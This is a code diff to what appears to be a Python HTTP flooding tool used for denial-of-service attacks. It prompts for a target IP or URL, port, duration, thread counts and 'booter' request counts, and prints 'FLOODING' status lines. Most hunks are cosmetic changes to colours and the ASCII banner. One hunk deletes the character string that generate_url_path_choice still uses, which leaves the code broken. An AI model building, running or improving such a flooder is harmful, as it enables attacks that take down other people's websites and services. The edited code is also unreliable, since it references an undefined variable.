@@ -23,7 +23,7 @@ def clear_text():
         os.system('clear')
 
 def status_print(ip,port,thread_id,rps,path_get):
-    print(f"{Fore.YELLOW}FLOODING {Fore.LIGHTYELLOW_EX}HTTP {Fore.WHITE}---> {Fore.BLUE}TARGET{Fore.WHITE}={ip}:{port} {Fore.LIGHTBLUE_EX}PATH{Fore.WHITE}={path_get} {Fore.CYAN}RPS{Fore.WHITE}={rps} {Fore.LIGHTCYAN_EX}ID{Fore.WHITE}={thread_id}{Fore.RESET}")
+    print(f"{Fore.YELLOW}FLOODING {Fore.LIGHTYELLOW_EX}HTTP {Fore.GREEN}-> {Fore.BLUE}TARGET{Fore.WHITE}={ip}:{port} {Fore.LIGHTBLUE_EX}PATH{Fore.WHITE}={path_get} {Fore.CYAN}RPS{Fore.WHITE}={rps} {Fore.LIGHTCYAN_EX}ID{Fore.WHITE}={thread_id}{Fore.RESET}")
 def generate_url_path_pyflooder(num):
     msg = str(string.ascii_letters + string.digits + string.punctuation)
     data = "".join(random.sample(msg, int(num)))
@@ -46,8 +46,7 @@ def generate_url_path_pyflooder(num):
     data = "".join(random.sample(msg, int(num)))
     return data
     
-def generate_url_path_choice(num):
-    letter = '''abcdefghijklmnopqrstuvwxyzABCDELFGHIJKLMNOPQRSTUVWXYZ0123456789!"#$%&'()*+,-./:;?@[\]^_`{|}~'''
+def generate_url_path_choice(num): 
     data = ""
     for _ in range(int(num)):
         data += random.choice(letter)
@@ -102,15 +101,15 @@ def runing_attack(ip,host,port_loader,time_loader,spam_loader,methods_loader,boo
 
 #DATA
 banner = f"""
-{Fore.BLUE}███████▒▒  ██▒▒      ██▒▒  ████████▒▒ ██▒▒        ████▒▒     ███▒▒  ██████▒▒
-{Fore.BLUE}██▒▒   ██▒▒ ██▒▒    ██▒▒   ██▒▒       ██▒▒      ██▒ ██▒▒  ██▒  ██▒▒██▒▒  ██▒▒
-{Fore.BLUE}██▒▒   ██▒▒  ██▒▒  ██▒▒    ██▒▒       ██▒▒     ██▒▒   ██▒▒██▒▒  ██▒▒██▒▒   ██▒▒
-{Fore.BLUE}██▒▒   ██▒▒   ██▒▒██▒▒     ██▒▒       ██▒▒     ██▒▒   ██▒▒██▒▒  ██▒▒██▒▒   ██▒▒
-{Fore.CYAN}███████▒▒       ██▒▒       ██████▒▒   ██▒▒     ██▒▒   ██▒▒██▒▒  ██▒▒██▒▒   ██▒▒
-{Fore.CYAN}██▒▒            ██▒▒       ██▒▒       ██▒▒      ██▒   ██▒▒  ██▒▒██▒▒ ██▒▒ ██▒▒
-{Fore.CYAN}██▒▒            ██▒▒       ██▒▒       ████████▒▒ ████▒▒     ████▒▒   ██████▒▒
-{Fore.CYAN} ▒▒▒              ▒▒▒        ▒▒▒        ▒▒ ▒▒ ▒▒   ▒▒ ▒▒      ▒ ▒▒     ▒▒▒▒▒
-{Fore.CYAN}  ▒                ▒▒         ▒▒          ▒ ▒ ▒      ▒ ▒        ▒▒        ▒▒
+{Fore.BLUE}████████▒▒ ██▒▒        ████▒▒     ███▒▒  ██████▒▒
+{Fore.BLUE}██▒▒       ██▒▒      ██▒ ██▒▒  ██▒  ██▒▒██▒▒  ██▒▒
+{Fore.BLUE}██▒▒       ██▒▒     ██▒▒   ██▒▒██▒▒  ██▒▒██▒▒   ██▒▒
+{Fore.BLUE}██▒▒       ██▒▒     ██▒▒   ██▒▒██▒▒  ██▒▒██▒▒   ██▒▒
+{Fore.CYAN}██████▒▒   ██▒▒     ██▒▒   ██▒▒██▒▒  ██▒▒██▒▒   ██▒▒
+{Fore.CYAN}██▒▒       ██▒▒      ██▒   ██▒▒  ██▒▒██▒▒ ██▒▒ ██▒▒
+{Fore.CYAN}██▒▒       ████████▒▒ ████▒▒     ████▒▒   ██████▒▒
+{Fore.CYAN}▒▒▒        ▒▒ ▒▒ ▒▒   ▒▒ ▒▒      ▒ ▒▒     ▒▒▒▒▒
+{Fore.CYAN}▒▒          ▒ ▒ ▒      ▒ ▒        ▒▒        ▒▒
 {Fore.RED}===============================================================================
 {Fore.LIGHTRED_EX}[[   ==> internal script By: ZA                  ]]                                                   
 {Fore.WHITE}================================================================={Fore.YELLOW}#{Fore.LIGHTYELLOW_EX}TOOL #{Fore.RESET}"""
@@ -120,8 +119,8 @@ host = ""
 ip = ""
 target_loader = input(f"{Fore.LIGHTYELLOW_EX}IP/URL>")
 port_loader = int(input(f"{Fore.YELLOW}PORT>"))
-time_loader = time.time() + int(input(f"{Fore.LIGHTRED_EX}TIME (DEFAULT=125)>"))
-spam_loader = int(input(f"{Fore.RED}SPAM THREAD (DEFAULT=50 OR 200)>"))
+time_loader = time.time() + int(input(f"{Fore.BLUE}TIME (DEFAULT=125)>"))
+spam_loader = int(input(f"{Fore.YELLOW}SPAM THREAD (DEFAULT=50 OR 200)>"))
 create_thread = int(input(F"{Fore.LIGHTGREEN_EX}CREATE THREAD (DEFAULT=25)>"))
 booter_sent = int(input(F"{Fore.GREEN}BOOTER SENT (DEFAULT=300)>"))
 print(f"{Fore.LIGHTCYAN_EX}EXAMPLE HTTP METHODS> CONNECT GET PUT PATCH POST HEAD ")
